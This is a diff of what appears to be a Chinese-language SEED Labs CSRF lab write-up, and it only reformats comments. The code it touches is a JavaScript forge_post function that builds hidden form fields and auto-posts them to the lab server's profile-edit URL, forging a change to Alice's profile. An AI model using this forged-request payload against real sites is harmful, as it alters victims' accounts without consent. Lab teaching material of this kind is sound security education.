@@ -214,24 +214,19 @@ img 标签会自动发送 GET 请求，这样 `Alice` 点进 `Samy` 的个人资
     <script type="text/javascript">
         function forge_post() {
             var fields = ""; // 用于存储表单的字段
-
-            // 添加隐藏字段 'name'，值为 'Alice'
-            fields += "<input type='hidden' name='name' value='Alice'>";
-            // 添加隐藏字段 'briefdescription'，值为 'Samy is my Hero'
-            fields += "<input type='hidden' name='briefdescription' value='Samy is my Hero'>";
+            fields += "<input type='hidden' name='name' value='Alice'>";                  // 添加隐藏字段 'name'，值为 'Alice'
+             // 添加隐藏字段 'briefdescription'，值为 'Samy is my Hero'
+            fields += "<input type='hidden' name='briefdescription' value='Samy is my Hero'>";   
             // 添加隐藏字段 'accesslevel[briefdescription]'，值为 '2'
             fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
             // 添加隐藏字段 'guid'，值为 '56'
             fields += "<input type='hidden' name='guid' value='56'>";
 
-            // 创建一个新的表单元素
-            var p = document.createElement("form");
-            // 设置表单的提交目标 URL（攻击目标网站的特定路径）
-            p.action = "http://www.seed-server.com/action/profile/edit";
-            // 将上面定义的隐藏字段添加到表单的内部 HTML 中
-            p.innerHTML = fields;
-            // 设置表单的提交方法为 POST
-            p.method = "post";
+
+            var p = document.createElement("form");		            // 创建一个新的表单元素
+            p.action = "http://www.seed-server.com/action/profile/edit";              // 设置表单的提交目标 URL
+            p.innerHTML = fields; // 将上面定义的隐藏字段添加到表单的内部 HTML 中           
+            p.method = "post";   // 设置表单的提交方法为 POST
 
             // 将表单添加到当前页面的 DOM 中（页面的 body 部分）
             document.body.appendChild(p);
